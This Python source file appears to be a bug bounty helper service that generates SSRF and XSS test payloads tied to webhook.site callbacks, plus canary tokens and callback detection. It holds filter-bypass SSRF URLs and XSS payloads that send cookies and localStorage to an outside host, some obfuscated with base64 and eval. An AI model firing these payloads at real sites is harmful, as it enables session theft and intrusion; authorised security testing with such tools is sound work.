"""
Bug bounty helper service for generating test payloads.

Provides security testing utilities:
- SSRF payload generation
- XSS callback payloads
- Canary token generation
- OOB callback detection
- Link extraction from requests
"""

from __future__ import annotations

import re
import urllib.parse
from datetime import datetime, timedelta, timezone
from typing import Any

from models.schemas import ToolResult
from utils.http_client import WebhookHttpClient, WEBHOOK_SITE_API


class BugBountyService:
    """Service for bug bounty testing utilities.
    
    Provides payload generation and callback detection for:
    - SSRF testing
    - XSS detection
    - Canary tokens
    - Out-of-band vulnerability detection
    """
    
    def __init__(self, client: WebhookHttpClient) -> None:
        """Initialize service with HTTP client.
        
        Args:
            client: Configured WebhookHttpClient instance
        """
        self._client = client
    
    def generate_ssrf_payload(
        self,
        webhook_token: str,
        identifier: str | None = None,
        include_dns: bool = True,
        include_ip: bool = True,
    ) -> ToolResult:
        """Generate SSRF test payloads.
        
        Args:
            webhook_token: The webhook UUID
            identifier: Custom identifier for tracking
            include_dns: Include DNS-based payloads
            include_ip: Include IP-based payloads
            
        Returns:
            ToolResult with various SSRF payloads
        """
        id_param = f"?id={identifier}" if identifier else ""
        id_subdomain = f"{identifier}." if identifier else ""
        
        payloads = {
            "http_url": f"http://webhook.site/{webhook_token}{id_param}",
            "https_url": f"https://webhook.site/{webhook_token}{id_param}",
            "subdomain_url": f"https://{webhook_token}.webhook.site{id_param}",
        }
        
        if include_dns:
            payloads["dns_payload"] = f"{id_subdomain}{webhook_token}.dnshook.site"
            payloads["dns_with_data"] = f"ssrf.{id_subdomain}{webhook_token}.dnshook.site"
        
        if include_ip:
            # Common SSRF bypass techniques using IP variations
            payloads["localhost_bypass"] = f"http://127.0.0.1.nip.io/{webhook_token}{id_param}"
            payloads["decimal_ip"] = f"http://2130706433/{webhook_token}{id_param}"  # 127.0.0.1 in decimal
            payloads["url_encoded"] = urllib.parse.quote(f"https://webhook.site/{webhook_token}{id_param}")
            payloads["double_encoded"] = urllib.parse.quote(urllib.parse.quote(f"https://webhook.site/{webhook_token}"))
        
        # Bypass patterns
        payloads["at_bypass"] = f"https://evil.com@webhook.site/{webhook_token}"
        payloads["hash_bypass"] = f"https://webhook.site/{webhook_token}#@evil.com"
        payloads["redirect_chain"] = f"https://webhook.site/{webhook_token}?redirect=true"
        
        return ToolResult(
            success=True,
            message=f"Generated {len(payloads)} SSRF payloads",
            data={
                "token": webhook_token,
                "identifier": identifier,
                "payloads": payloads,
                "usage_tips": [
                    "Inject these URLs in parameters, headers, file imports, etc.",
                    "DNS payloads can detect SSRF even when HTTP response is blocked",
                    "Use check_for_callbacks to see if any payload triggered",
                    "The identifier helps track which injection point worked",
                ]
            }
        )
    
    async def check_for_callbacks(
        self,
        webhook_token: str,
        since_minutes: int = 60,
        identifier: str | None = None,
    ) -> ToolResult:
        """Check if any OOB callbacks were received.
        
        Args:
            webhook_token: The webhook UUID
            since_minutes: Only check requests from last N minutes
            identifier: Filter for specific identifier
            
        Returns:
            ToolResult with callback summary
        """
        # Calculate time filter
        now = datetime.now(timezone.utc)
        since = now - timedelta(minutes=since_minutes)
        date_from = since.strftime("%Y-%m-%d %H:%M:%S")
        
        params = {
            "per_page": 50,
            "sorting": "newest",
            "date_from": date_from,
        }
        
        if identifier:
            params["query"] = identifier
        
        data = await self._client.get(
            f"/token/{webhook_token}/requests",
            params=params,
        )
        
        requests_data = data.get("data", [])
        
        # Categorize by type
        web_requests = [r for r in requests_data if r.get("type") == "web"]
        dns_requests = [r for r in requests_data if r.get("type") == "dns"]
        email_requests = [r for r in requests_data if r.get("type") == "email"]
        
        # Extract useful info
        callbacks = []
        for req in requests_data:
            callback_info = {
                "type": req.get("type"),
                "method": req.get("method"),
                "ip": req.get("ip"),
                "user_agent": req.get("headers", {}).get("user-agent", "N/A"),
                "timestamp": req.get("created_at"),
                "url": req.get("url", ""),
            }
            if identifier and identifier in str(req):
                callback_info["matched_identifier"] = True
            callbacks.append(callback_info)
        
        detected = len(requests_data) > 0
        
        return ToolResult(
            success=True,
            message=f"{'CALLBACKS DETECTED!' if detected else 'No callbacks'} ({len(requests_data)} requests in last {since_minutes} min)",
            data={
                "detected": detected,
                "total_callbacks": len(requests_data),
                "by_type": {
                    "web": len(web_requests),
                    "dns": len(dns_requests),
                    "email": len(email_requests),
                },
                "since_minutes": since_minutes,
                "identifier_filter": identifier,
                "callbacks": callbacks[:10],  # Limit to most recent 10
            }
        )
    
    def generate_xss_callback(
        self,
        webhook_token: str,
        identifier: str | None = None,
        include_cookies: bool = True,
        include_dom: bool = True,
    ) -> ToolResult:
        """Generate XSS callback payloads.
        
        Args:
            webhook_token: The webhook UUID
            identifier: Custom identifier for tracking
            include_cookies: Include cookie exfiltration
            include_dom: Include DOM info capture
            
        Returns:
            ToolResult with various XSS payloads
        """
        callback_url = f"https://webhook.site/{webhook_token}"
        id_part = f"&id={identifier}" if identifier else ""
        
        payloads = {}
        
        # Basic callback
        payloads["basic_img"] = f'<img src="{callback_url}?xss=1{id_part}">'
        payloads["basic_script"] = f'<script>fetch("{callback_url}?xss=1{id_part}")</script>'
        
        # Cookie stealing
        if include_cookies:
            payloads["cookie_steal"] = f'<script>fetch("{callback_url}?c="+document.cookie)</script>'
            payloads["cookie_img"] = f'<img src=x onerror="this.src=\'{callback_url}?c=\'+document.cookie">'
        
        # DOM info capture
        if include_dom:
            payloads["dom_info"] = f'''<script>fetch("{callback_url}?url="+encodeURIComponent(location.href)+"&ref="+encodeURIComponent(document.referrer){id_part})</script>'''
            payloads["full_capture"] = f'''<script>fetch("{callback_url}",{{method:"POST",body:JSON.stringify({{url:location.href,cookies:document.cookie,localStorage:JSON.stringify(localStorage)}})}})</script>'''
        
        # Event-based triggers
        payloads["onerror"] = f'<img src=x onerror="fetch(\'{callback_url}?xss=onerror{id_part}\')">'
        payloads["onload"] = f'<body onload="fetch(\'{callback_url}?xss=onload{id_part}\')">'
        payloads["svg"] = f'<svg onload="fetch(\'{callback_url}?xss=svg{id_part}\')">'
        
        # Encoded variants
        payloads["base64"] = f'<script>eval(atob("{self._base64_encode(f"fetch('{callback_url}?xss=b64{id_part}')")}")</script>'
        payloads["unicode"] = self._unicode_encode(f'<script>fetch("{callback_url}?xss=uni{id_part}")</script>')
        
        return ToolResult(
            success=True,
            message=f"Generated {len(payloads)} XSS payloads",
            data={
                "token": webhook_token,
                "identifier": identifier,
                "payloads": payloads,
                "usage_tips": [
                    "Try each payload in input fields, URL params, headers",
                    "Cookie stealing payloads may be blocked by HttpOnly flag",
                    "Use check_for_callbacks to see if XSS was triggered",
                    "SVG and onerror variants bypass some filters",
                ]
            }
        )
    
    def generate_canary_token(
        self,
        webhook_token: str,
        token_type: str = "url",
        identifier: str | None = None,
    ) -> ToolResult:
        """Generate canary tokens.
        
        Args:
            webhook_token: The webhook UUID
            token_type: Type of canary ('url', 'dns', 'email')
            identifier: Custom identifier
            
        Returns:
            ToolResult with canary token and instructions
        """
        id_part = f"?canary={identifier}" if identifier else "?canary=triggered"
        id_subdomain = f"{identifier}." if identifier else "canary."
        
        canary = {}
        instructions = []
        
        if token_type == "url":
            canary["token"] = f"https://webhook.site/{webhook_token}{id_part}"
            canary["short_url"] = f"https://{webhook_token}.webhook.site{id_part}"
            instructions = [
                "Embed this URL in documents, source code, or configs",
                "When accessed, you'll get an alert with IP and user-agent",
                "Use in: HTML links, README files, config values, PDF links",
            ]
        elif token_type == "dns":
            canary["token"] = f"{id_subdomain}{webhook_token}.dnshook.site"
            canary["nslookup_command"] = f"nslookup {id_subdomain}{webhook_token}.dnshook.site"
            instructions = [
                "Any DNS lookup to this domain will be captured",
                "Useful for detecting data exfiltration attempts",
                "Embed in hostnames, SSRF payloads, or config files",
            ]
        elif token_type == "email":
            canary["token"] = f"{webhook_token}@email.webhook.site"
            canary["display_format"] = f"Confidential <{webhook_token}@email.webhook.site>"
            instructions = [
                "Any email to this address will be captured",
                "Use as a fake 'internal' contact in leaked documents",
                "Good for testing if credentials/docs were accessed",
            ]
        
        return ToolResult(
            success=True,
            message=f"Generated {token_type} canary token",
            data={
                "type": token_type,
                "identifier": identifier,
                "canary": canary,
                "instructions": instructions,
                "check_command": "Use check_for_callbacks to see if triggered",
            }
        )
    
    async def extract_links_from_request(
        self,
        webhook_token: str,
        request_id: str | None = None,
        filter_domain: str | None = None,
    ) -> ToolResult:
        """Extract links from a captured request.
        
        Args:
            webhook_token: The webhook UUID
            request_id: Specific request to analyze (or latest)
            filter_domain: Only return links matching domain
            
        Returns:
            ToolResult with extracted links
        """
        # Get the request content
        if request_id:
            data = await self._client.get(
                f"/token/{webhook_token}/request/{request_id}"
            )
            requests = [data]
        else:
            data = await self._client.get(
                f"/token/{webhook_token}/requests",
                params={"per_page": 1, "sorting": "newest"}
            )
            requests = data.get("data", [])
        
        if not requests:
            return ToolResult(
                success=False,
                message="No requests found",
                data=None
            )
        
        request = requests[0]
        content = request.get("content", "") or request.get("text_content", "")
        
        # Extract all URLs using regex
        url_pattern = r'https?://[^\s<>"\')\]]+|www\.[^\s<>"\')\]]+'
        all_links = re.findall(url_pattern, content, re.IGNORECASE)
        
        # Clean up links
        cleaned_links = []
        for link in all_links:
            # Remove trailing punctuation
            link = link.rstrip('.,;:!?')
            if not link.startswith('http'):
                link = 'https://' + link
            cleaned_links.append(link)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_links = []
        for link in cleaned_links:
            if link not in seen:
                seen.add(link)
                unique_links.append(link)
        
        # Filter by domain if specified
        if filter_domain:
            unique_links = [l for l in unique_links if filter_domain in l]
        
        # Categorize links
        categorized = {
            "auth_links": [l for l in unique_links if any(k in l.lower() for k in ['token', 'auth', 'verify', 'reset', 'confirm', 'magic', 'login'])],
            "api_links": [l for l in unique_links if any(k in l.lower() for k in ['api', 'webhook', 'callback'])],
            "all_links": unique_links,
        }
        
        return ToolResult(
            success=True,
            message=f"Extracted {len(unique_links)} unique links",
            data={
                "request_id": request.get("uuid"),
                "request_type": request.get("type"),
                "total_links": len(unique_links),
                "filter_domain": filter_domain,
                "links": categorized,
            }
        )
    
    @staticmethod
    def _base64_encode(text: str) -> str:
        """Base64 encode a string."""
        import base64
        return base64.b64encode(text.encode()).decode()
    
    @staticmethod
    def _unicode_encode(text: str) -> str:
        """Unicode escape a string."""
        return ''.join(f'\\u{ord(c):04x}' if ord(c) > 127 or c in '<>"' else c for c in text)
